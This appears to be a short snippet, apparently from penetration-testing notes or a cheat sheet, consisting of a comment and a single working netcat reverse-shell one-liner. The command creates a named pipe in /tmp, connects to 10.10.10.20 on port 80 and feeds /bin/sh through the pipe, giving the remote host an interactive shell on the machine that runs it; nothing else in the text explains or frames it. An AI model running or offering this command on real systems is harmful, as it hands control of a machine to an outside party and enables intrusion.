# send a netcat reverse shell using named pipes
mkfifo /tmp/f; nc 10.10.10.20 80 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f